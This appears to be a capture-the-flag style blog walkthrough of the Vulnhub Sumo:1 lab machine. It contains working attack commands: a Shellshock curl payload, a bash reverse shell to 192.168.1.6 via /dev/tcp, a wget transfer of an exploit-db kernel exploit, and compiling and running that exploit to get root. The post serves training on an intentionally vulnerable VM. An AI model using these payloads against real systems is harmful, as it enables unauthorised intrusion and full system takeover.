---
date: 2020-06-17 00:36:33
layout: post
title: "Sumo Vulnhub Walkthrough"
subtitle:
description: Today we will be doing Sumo:1 from Vulnhub. This machine is rated easy and good for beginners.
image: /assets/img/uploads/sumo/sumo-optimized.png
optimized_image: /assets/img/uploads/sumo/sumo-optimized.png
category: walkthrough
tags: vulnhub boot2root
author:
paginate: false
---

Today we will be doing Sumo:1 from Vulnhub. This machine is rated easy and good for beginners. This includes exploiting a shellshock vulnerability to get a reverse shell and then exploiting the old version kernel used by the VM to get root. I've add the IP to my hosts file, So Lets Begin!

```r
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.16    sumo.local
```

## Inital Enumeration and User Shell

I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```r
root@kali:~# nmap -sC -sV -oA nmap/sumo sumo.local

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 13:06 IST
Nmap scan report for sumo.local (192.168.1.16)
Host is up (0.00060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:97:C2:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
```

We have a port 80 open which displays a default web server page says that "It Works!"

<center><br>
<img src="/assets/img/uploads/sumo/port80.png">
</center>
<p align="justify">
Next I ran a gobuster scan to look for hidden directories, but didn't find anything interesting there. Then I performed a nikto scan to search for some web based vulnerabilities and found that this web server is vulnerable to <b>shellshock vulnerability.</b> </p>

```r
root@kali:~# nikto -h sumo.local
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.16
+ Target Hostname:    sumo.local
+ Target Port:        80
+ Start Time:         2020-06-16 13:11:34 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 23:25:10 2020
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8595 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-06-16 13:12:15 (GMT5.5) (41 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">here.</a> I tested the vulnerability by running <b>id</b> command.
```r
root@kali:~# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://sumo.local/cgi-bin/test/test.cgi  

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Excellent, We were able to exploit this vulnerability. Now I executed a payload to open a reverse shell.

```r
root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.6/9001 0>&1' http://sumo.local/cgi-bin/test/test.cgi  
```
I opened a netcat listner on the other terminal and we got the reverse shell.

```r
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.16] 60230
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Root Shell
<p align="justify">
Getting root on this machine was quite easy and straight forward. This machine is a using an old version of kernel. There are many exploits available to escalate the privileges. One of the most famous is Dirty Cow but I won't be using it here.
</p>

```r
www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

Instead I used <a href="https://www.exploit-db.com/exploits/33589"> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and tranferred it to the target machine in the tmp directory.

```r
www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
cd /tmp

www-data@ubuntu:/tmp$ wget http://192.168.1.6:8000/33589.c
wget http://192.168.1.6:8000/33589.c     
--2020-06-16 03:50:50--  http://192.168.1.6:8000/33589.c
Connecting to 192.168.1.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3664 (3.6K) [text/plain]         
Saving to: `33589.c'                     

     0K ...         100%  242M=0s
2020-06-16 03:50:50 (242 MB/s) - `33589.c' saved [3664/3664]
```
Then I tried to complite the exploit but it gave an error. This error can be fixed by updating the path variables using the following command:

```r
www-data@ubuntu:/tmp$ PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH   
```

This time the exploit complied without any errors, I gave the exploit executable permissions and after running the exploit, we were root!  

```r
www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o exploit
gcc 33589.c -O2 -o exploit

www-data@ubuntu:/tmp$ chmod 777 exploit && ./exploit 0
chmod 777 exploit && ./exploit 0

stdin: is not a tty
id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty;pty.spawn("/bin/bash")'

root@ubuntu:/tmp# cat /root/root.txt
cat /root/root.txt
{Sum0-SunCSR-2020_r001}
```
<p align="justify"> That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future! If you have any queries, you can contact me <a href="/contact">here.</a> </p>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/MarkusM">Markus Magnusson.</a>